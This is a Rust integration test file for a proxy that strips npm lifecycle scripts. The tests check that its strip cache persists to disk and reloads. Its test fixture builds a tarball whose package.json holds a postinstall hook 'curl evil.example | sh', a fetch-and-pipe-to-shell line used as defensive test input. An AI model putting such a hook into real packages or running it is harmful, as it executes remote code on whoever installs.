//! Strip-cache persistence end-to-end. Proves the wiring between
//! `ProxyConfig.lifecycle_strip_cache_dir` → `run()` →
//! `StripCache::with_persist_dir` works in both directions:
//!
//! 1. A real install through the proxy under
//!    `LifecyclePolicy::Strip` populates the on-disk cache.
//! 2. A fresh `StripCache::with_persist_dir(<same_dir>)` loads
//!    the entry back into memory with the correct
//!    `(new_integrity, new_shasum, bytes)` shape.
//!
//! The inline tests in `src/strip_cache.rs::tests` already cover
//! the cache's own roundtrip when constructed directly. This file
//! adds the proxy-level seam: a regression that stopped wiring
//! `lifecycle_strip_cache_dir` into the handler — or stopped
//! firing `cache.insert` on the lazy strip path in `handle_response`
//! — would pass every existing test and silently lose the
//! cross-restart benefit users opt into with
//! `--lifecycle-strip-cache-dir`.

use std::io::Write;
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use flate2::Compression;
use flate2::write::GzEncoder;
use sakimori_proxy::ca::CaFiles;
use sakimori_proxy::lifecycle::LifecyclePolicy;
use sakimori_proxy::strip_cache::{StripCache, StripCacheEntry};
use sakimori_proxy::{ProxyConfig, RegistryHosts};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio::sync::Notify;

// ---------------------------------------------------------------------------
// Harness
// ---------------------------------------------------------------------------

fn tmp_dir(tag: &str) -> std::path::PathBuf {
    use std::sync::atomic::{AtomicU64, Ordering};
    static SEQ: AtomicU64 = AtomicU64::new(0);
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let seq = SEQ.fetch_add(1, Ordering::Relaxed);
    std::env::temp_dir().join(format!(
        "sakimori-strip-cache-e2e-{tag}-{}-{nanos}-{seq}",
        std::process::id()
    ))
}

fn malicious_tarball() -> Vec<u8> {
    let pkg_json = br#"{"name":"demo","version":"1.0.0","scripts":{"postinstall":"curl evil.example | sh","test":"jest"}}"#;
    let index_js = b"console.log('hi');\n";
    let mut tar_bytes = Vec::new();
    {
        let mut builder = tar::Builder::new(&mut tar_bytes);
        for (path, body) in [
            ("package/package.json", &pkg_json[..]),
            ("package/index.js", &index_js[..]),
        ] {
            let mut header = tar::Header::new_gnu();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            header.set_entry_type(tar::EntryType::Regular);
            header.set_cksum();
            builder.append_data(&mut header, path, body).unwrap();
        }
        builder.finish().unwrap();
    }
    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    gz.write_all(&tar_bytes).unwrap();
    gz.finish().unwrap()
}

async fn spawn_mock_tarball_upstream(body: Vec<u8>) -> std::net::SocketAddr {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let body = Arc::new(body);
    tokio::spawn(async move {
        loop {
            let (mut sock, _peer) = match listener.accept().await {
                Ok(p) => p,
                Err(_) => break,
            };
            let body = body.clone();
            tokio::spawn(async move {
                let mut buf = Vec::with_capacity(2048);
                let mut tmp = [0u8; 1024];
                loop {
                    match sock.read(&mut tmp).await {
                        Ok(0) => return,
                        Ok(n) => {
                            buf.extend_from_slice(&tmp[..n]);
                            if buf.windows(4).any(|w| w == b"\r\n\r\n") {
                                break;
                            }
                            if buf.len() > 64 * 1024 {
                                return;
                            }
                        }
                        Err(_) => return,
                    }
                }
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                    body.len()
                );
                let _ = sock.write_all(resp.as_bytes()).await;
                let _ = sock.write_all(&body).await;
                let _ = sock.shutdown().await;
            });
        }
    });
    addr
}

async fn spawn_proxy_with_strip_cache(persist_dir: std::path::PathBuf) -> std::net::SocketAddr {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    drop(listener);

    let config_dir = tmp_dir("proxy");
    std::fs::create_dir_all(&config_dir).unwrap();
    let mut cfg = ProxyConfig::default_dev().unwrap();
    cfg.listen = addr;
    cfg.ca_files = CaFiles::at(config_dir);
    cfg.install_log_enabled = false;
    cfg.registries = RegistryHosts {
        npm: vec!["127.0.0.1".into()],
        ..RegistryHosts::default()
    };
    cfg.lifecycle_policy = Some(LifecyclePolicy::Strip);
    cfg.lifecycle_strip_cache_dir = Some(persist_dir);

    tokio::spawn(async move {
        if let Err(e) = sakimori_proxy::run(cfg).await {
            eprintln!("proxy exited: {e:#}");
        }
    });

    let ready = Arc::new(Notify::new());
    let ready2 = ready.clone();
    tokio::spawn(async move {
        for _ in 0..200 {
            if tokio::net::TcpStream::connect(addr).await.is_ok() {
                ready2.notify_one();
                return;
            }
            tokio::time::sleep(Duration::from_millis(25)).await;
        }
    });
    tokio::time::timeout(Duration::from_secs(6), ready.notified())
        .await
        .expect("proxy did not come up");
    addr
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn strip_cache_persists_through_full_proxy_path_and_reloads() {
    let persist_dir = tmp_dir("strip-cache");
    let tarball = malicious_tarball();
    let upstream = spawn_mock_tarball_upstream(tarball.clone()).await;
    let proxy = spawn_proxy_with_strip_cache(persist_dir.clone()).await;

    // Drive an install through the proxy. The strip-mode lazy path
    // in `handle_response` should:
    //   1. Strip the tarball
    //   2. Write the (key, entry) through to `persist_dir/`
    //   3. Serve the rewritten bytes
    let url = format!("http://127.0.0.1:{}/demo/-/demo-1.0.0.tgz", upstream.port());
    let proxy_spec = format!("http://{proxy}");
    let body = tokio::task::spawn_blocking(move || -> std::result::Result<Vec<u8>, String> {
        let agent = ureq::AgentBuilder::new()
            .proxy(ureq::Proxy::new(&proxy_spec).unwrap())
            .timeout(Duration::from_secs(10))
            .build();
        let resp = agent.get(&url).call().map_err(|e| format!("{e:?}"))?;
        let status = resp.status();
        if status != 200 {
            return Err(format!("status:{status}"));
        }
        let mut buf = Vec::new();
        use std::io::Read;
        resp.into_reader()
            .take(4 * 1024 * 1024)
            .read_to_end(&mut buf)
            .map_err(|e| e.to_string())?;
        Ok(buf)
    })
    .await
    .unwrap()
    .expect("install through strip proxy succeeds");
    assert_ne!(
        body, tarball,
        "strip mode must rewrite the tarball, not return the original",
    );

    // On-disk files must exist. The lazy-strip path writes via
    // `cache.insert` synchronously within `handle_response`, so by
    // the time the client receives the rewritten body the files
    // are already on disk.
    let entries: Vec<_> = std::fs::read_dir(&persist_dir)
        .expect("persist_dir must exist")
        .filter_map(|e| e.ok())
        .map(|e| e.file_name())
        .collect();
    let has_json = entries
        .iter()
        .any(|n| n.to_string_lossy().ends_with(".json"));
    let has_tgz = entries
        .iter()
        .any(|n| n.to_string_lossy().ends_with(".tgz"));
    assert!(
        has_json,
        "strip-cache must write a `.json` metadata file: {entries:?}",
    );
    assert!(
        has_tgz,
        "strip-cache must write a paired `.tgz` body file for Stripped entries: {entries:?}",
    );

    // Reload the cache into a fresh in-memory instance via the
    // public `with_persist_dir` constructor — same path the proxy
    // takes on the next startup. Must surface exactly one entry,
    // matching the bytes the client received.
    let cache = StripCache::with_persist_dir(persist_dir.clone())
        .expect("fresh StripCache loads the persisted dir");
    assert_eq!(
        cache.len(),
        1,
        "fresh StripCache must load exactly one entry from disk",
    );

    // We can't construct the StripKey directly without recomputing
    // sha512 of the original tarball, but we don't need to — there
    // is only one entry. Walk the persisted .json to discover the
    // key, then re-`get` to validate the round-trip.
    let json_path = std::fs::read_dir(&persist_dir)
        .unwrap()
        .filter_map(|e| e.ok())
        .map(|e| e.path())
        .find(|p| p.extension().is_some_and(|x| x == "json"))
        .expect("metadata json present");
    let json_text = std::fs::read_to_string(&json_path).unwrap();
    let meta: serde_json::Value = serde_json::from_str(&json_text).unwrap();
    let stored_name = meta["name"].as_str().expect("metadata.name").to_string();
    let stored_version = meta["version"]
        .as_str()
        .expect("metadata.version")
        .to_string();
    let stored_integrity = meta["orig_integrity"]
        .as_str()
        .expect("metadata.orig_integrity")
        .to_string();
    assert_eq!(stored_name, "demo");
    assert_eq!(stored_version, "1.0.0");
    assert!(
        stored_integrity.starts_with("sha512-"),
        "orig_integrity must be an SRI string, got {stored_integrity}",
    );

    let key = sakimori_proxy::strip_cache::StripKey {
        name: stored_name,
        version: stored_version,
        orig_integrity: stored_integrity,
    };
    match cache
        .get(&key)
        .expect("loaded cache must produce a hit for the persisted key")
    {
        StripCacheEntry::Stripped {
            new_integrity,
            new_shasum,
            bytes,
        } => {
            assert!(
                new_integrity.starts_with("sha512-"),
                "new_integrity must carry SRI prefix"
            );
            assert_eq!(new_shasum.len(), 40, "sha1 hex is 40 chars");
            assert_eq!(
                bytes.as_slice(),
                body.as_slice(),
                "loaded bytes must equal the rewritten body served to the client",
            );
        }
        StripCacheEntry::NoStripNeeded => {
            panic!("a tarball with a postinstall must produce Stripped, not NoStripNeeded")
        }
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn strip_cache_disk_layout_survives_arbitrary_clean_directory() {
    // Pre-create the persist dir with junk files in it (a stale
    // `.tgz` from a previous run, a `README` someone dropped, an
    // empty dir). The loader must skip them quietly without
    // failing the construction. Catches "loader is over-strict
    // about dir contents" regressions.
    let persist_dir = tmp_dir("strip-cache-junk");
    std::fs::create_dir_all(&persist_dir).unwrap();
    std::fs::write(persist_dir.join("README"), b"not a strip cache entry").unwrap();
    std::fs::write(persist_dir.join("orphan.tgz"), b"orphan tarball").unwrap();
    std::fs::create_dir_all(persist_dir.join("inner-dir")).unwrap();

    let cache = StripCache::with_persist_dir(persist_dir.clone())
        .expect("StripCache must tolerate arbitrary clean dir contents");
    assert!(
        cache.is_empty(),
        "no metadata json → cache must load empty even with junk files in dir",
    );
}
